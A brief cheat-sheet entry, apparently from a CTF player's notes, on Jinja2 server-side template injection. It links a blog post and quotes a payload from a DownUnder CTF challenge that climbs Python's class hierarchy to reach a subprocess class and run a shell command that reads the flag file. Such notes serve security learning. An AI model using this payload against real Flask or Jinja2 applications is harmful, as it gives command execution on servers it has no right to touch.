

#jinja2 
https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

### usage examples:

During the downunder CTF - a challenge used this to expose the flag. The input was:
`{{ ''.__class__.__mro__[1].__subclasses__()[213]('/usr/bin/cat flag', shell=True, stdout=-1).communicate() }}`
